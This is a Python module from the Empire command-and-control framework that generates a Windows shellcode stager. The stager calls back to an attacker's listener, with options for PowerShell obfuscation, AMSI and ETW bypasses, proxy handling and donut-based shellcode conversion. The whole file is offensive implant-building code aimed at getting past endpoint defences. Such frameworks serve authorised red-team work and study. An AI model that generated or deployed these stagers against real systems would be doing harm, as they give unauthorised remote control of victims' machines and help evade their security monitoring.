from __future__ import print_function
from builtins import object
from empire.server.common import helpers

import donut
import base64

class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Shellcode Launcher',

            'Author': ['@xorrior', '@monogas'],

            'Description': 'Generate a windows shellcode stager',

            'Comments': ['']
        }

        self.options = {
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': '',
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell', 'csharp', 'python'],
                'Strict': True
            },
            'DotNetVersion': {
                'Description': 'Language of the stager to generate(powershell, csharp).',
                'Required': True,
                'Value': 'net40',
                'SuggestedValues': ['net35', 'net40'],
                'Strict': True
            },
            'Architecture': {
                'Description': 'Architecture of the .dll to generate (x64 or x86).',
                'Required': True,
                'Value': 'both',
                'SuggestedValues': ['x64', 'x86', 'both'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': True,
                'Value': 'launcher.bin'
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'Bypasses': {
                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                'Required': False,
                'Value': 'mattifestation etw'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        self.options.pop('Output', None)  # clear the previous output
        # staging options
        language = self.options['Language']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        listener_name = self.options['Listener']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        dot_net_version = self.options['DotNetVersion']['Value']
        bypasses = self.options['Bypasses']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']
        outfile = self.options['OutFile']['Value']
        arch = self.options['Architecture']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return "[!] Invalid listener: " + listener_name

        else:
            obfuscate_script = False
            if obfuscate.lower() == "true":
                obfuscate_script = True

        # generate the PowerShell one-liner with all of the proper options set
        launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=False,
                                                           obfuscate=obfuscate_script,
                                                           obfuscationCommand=obfuscate_command,
                                                           userAgent=user_agent, proxy=proxy,
                                                           proxyCreds=proxy_creds, stagerRetries=stager_retries,
                                                           bypasses=bypasses)
        if launcher == "":
            return "[!] Error in launcher generation."
        else:
            if not launcher or launcher.lower() == "failed":
                return "[!] Error in launcher command generation."

        if language.lower() == 'powershell':
            shellcode = self.mainMenu.stagers.generate_powershell_shellcode(launcher, arch=arch, dot_net_version=dot_net_version)
            return shellcode

        elif language.lower() == 'csharp':
            if arch == 'x86':
                arch_type = 1
            elif arch == 'x64':
                arch_type = 2
            elif arch == 'both':
                arch_type = 3

            directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{launcher}.exe"
            shellcode = donut.create(file=directory, arch=arch_type)
            return shellcode

        elif language.lower() == 'python':
            shellcode = self.mainMenu.stagers.generate_python_shellcode(launcher, arch=arch, dot_net_version=dot_net_version)
            return shellcode

        else:
            return "[!] Invalid launcher language."